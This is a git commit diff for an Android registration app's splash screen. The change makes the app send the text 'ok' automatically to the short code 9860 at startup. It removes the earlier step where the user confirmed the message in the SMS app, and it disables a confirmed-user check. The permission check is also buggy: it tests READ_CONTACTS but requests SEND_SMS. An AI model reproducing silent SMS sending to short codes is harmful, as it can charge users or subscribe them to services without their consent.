65acbaa11d63fddcb5707dcccbba6197478754c4
Akash Singh <akash@revmedia.my>
2023-06-02 02:44:07 +0800

    Direct Message on higher version.

--- app/src/main/java/com/akrobyte/registration/SplashActivity.java
+++ app/src/main/java/com/akrobyte/registration/SplashActivity.java
@@ -1,27 +1,92 @@
 package com.akrobyte.registration;
 
+import android.Manifest;
 import android.app.Activity;
+import android.app.AppComponentFactory;
 import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.telephony.SmsManager;
+import android.view.LayoutInflater;
+import android.view.View;
+import android.view.Window;
+import android.widget.TextView;
+
+import androidx.appcompat.app.AlertDialog;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 import com.anviam.vloader.R;
 
-public class SplashActivity extends Activity {
-
+public class SplashActivity extends AppCompatActivity {
+    private static final int PERMISSION_SEND_SMS = 123;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_splash);
-        if (!isConfirmUser())
+      /*  if (!isConfirmUser())
+            sendSMS();*/
+        requestSmsPermission();
+    }
+
+    private void requestSmsPermission() {
+
+        // check permission is given
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            // request permission (see result in onRequestPermissionsResult() method)
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.SEND_SMS},
+                    PERMISSION_SEND_SMS);
+        } else {
+            // permission already granted run sms send
             sendSMS();
+        }
+    }
+
+    private void goToAppSettings() {
+        AlertDialog.Builder dialogBuilder = new AlertDialog.Builder(this);
+// ...Irrelevant code for customizing the buttons and title
+        LayoutInflater inflater = this.getLayoutInflater();
+        View dialogView = inflater.inflate(R.layout.opensettingdialog, null);
+        dialogBuilder.setView(dialogView);
+        final AlertDialog alertDialog = dialogBuilder.create();
+        TextView textView = dialogView.findViewById(R.id.buttonOk);
+        textView.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                Uri uri = Uri.fromParts("package", getPackageName(), null);
+                intent.setData(uri);
+                startActivity(intent);
+                alertDialog.dismiss();
+            }
+        });
+
+        alertDialog.show();
+
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_SEND_SMS) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                // permission was granted
+                sendSMS();
+            } else {
+                goToAppSettings();
+            }
+            return;
+        }
     }
 
     private void sendSMS() {
@@ -68,10 +133,10 @@ public class SplashActivity extends Activity {
         intentFilter2 = new IntentFilter(str2);
         Intent registerReceiver2 = registerReceiver(broadcastReceiver2, intentFilter2);
 
-       /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
             SmsManager.getDefault().sendTextMessage("9860", null, "ok",broadcast,broadcast2);
-        }*/
-        String phoneNumber = "9860";
+        }
+       /* String phoneNumber = "9860";
         String message = "Ok";
 
         // Open the SMS app with the specified number and message
@@ -80,7 +145,7 @@ public class SplashActivity extends Activity {
         intent3.putExtra("sms_body", message);
         startActivity(intent3);
 
-        finish();
+        finish();*/
         unregisterReceiver(broadcastReceiver);
         unregisterReceiver(broadcastReceiver2);
     }
